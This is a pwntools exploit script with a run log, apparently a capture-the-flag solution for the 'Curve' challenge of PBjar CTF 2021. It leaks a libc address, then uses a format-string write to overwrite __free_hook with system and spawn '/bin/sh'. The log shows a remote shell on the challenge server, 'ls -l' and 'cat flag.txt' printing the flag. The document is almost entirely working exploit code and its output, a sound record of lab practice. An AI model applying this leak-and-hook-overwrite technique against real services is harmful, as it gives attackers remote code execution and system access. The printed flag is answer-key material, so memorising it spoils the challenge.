from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './curve'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "143.198.127.103"
  PORT = 42004
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.31.so")
else:
  s = process(BINARY)
  libc = elf.libc
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.31.so'})
  #libc = ELF("./libc-2.31.so")

s.sendlineafter("Input 1:\n", "A"*0x98)
s.recvuntil("A"*0x98)
libc_leak = u64(s.recvuntil("\nI")[:-2] + b"\x00\x00")
libc_base = libc_leak - libc.sym.__libc_start_main - 234
free_hook = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

buf  = p64(free_hook)
buf += p64(free_hook+2)
buf += p64(free_hook+4)
s.sendline(buf)

index = 8

a0 = system_addr&0xffff
a1 = (system_addr>>16)&0xffff
a2 = (system_addr>>32)&0xffff
a2 = ((a2-a1-1) % 0x10000) + 1
a1 = ((a1-a0-1) % 0x10000) + 1
a0 = ((a0-9) % 0x10000) + 1
buf  = "/bin/sh;" 
buf += "%%%dc%%%d$hn" % (a0, index)
buf += "%%%dc%%%d$hn" % (a1, index+1)
buf += "%%%dc%%%d$hn" % (a2, index+2)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_Curve/curve$ python3 solve.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 143.198.127.103 on port 42004: Done
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7fe4cd851d0a
libc_base = 0x7fe4cd82b000
...
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 2028
lrwxrwxrwx   1 root root       7 Aug 27 07:16 bin -> usr/bin
drwxr-xr-x   2 root root    4096 Apr 15  2020 boot
drwxr-xr-x   5 root root     340 Sep 17 04:48 dev
drwxr-xr-x   1 root root    4096 Sep 17 04:48 etc
-rwxr-xr-x   1 root root      64 Sep 17 04:28 flag.txt
drwxr-xr-x   1 root root    4096 Sep 17 04:47 home
-rwxr-xr-x   1 root root  177928 Sep 17 04:28 ld-2.31.so
lrwxrwxrwx   1 root root       7 Aug 27 07:16 lib -> usr/lib
lrwxrwxrwx   1 root root       9 Aug 27 07:16 lib32 -> usr/lib32
lrwxrwxrwx   1 root root       9 Aug 27 07:16 lib64 -> usr/lib64
-rwxr-xr-x   1 root root 1839792 Sep 17 04:28 libc-2.31.so
lrwxrwxrwx   1 root root      10 Aug 27 07:16 libx32 -> usr/libx32
drwxr-xr-x   2 root root    4096 Aug 27 07:16 media
drwxr-xr-x   2 root root    4096 Aug 27 07:16 mnt
drwxr-xr-x   2 root root    4096 Aug 27 07:16 opt
dr-xr-xr-x 262 root root       0 Sep 17 04:48 proc
drwx------   2 root root    4096 Aug 27 07:27 root
drwxr-xr-x   5 root root    4096 Aug 27 07:27 run
lrwxrwxrwx   1 root root       8 Aug 27 07:16 sbin -> usr/sbin
drwxr-xr-x   2 root root    4096 Aug 27 07:16 srv
dr-xr-xr-x  13 root root       0 Sep 17 04:48 sys
drwxrwxrwt   1 root root    4096 Sep 17 04:38 tmp
drwxr-xr-x   1 root root    4096 Aug 27 07:16 usr
drwxr-xr-x   1 root root    4096 Aug 27 07:27 var
$ cat flag.txt
flag{n0w_y0ur3_3v1l_m0rty_t00_s00n3r_0r_l4t3r_w3_4ll_4r3_s4dg3}
'''
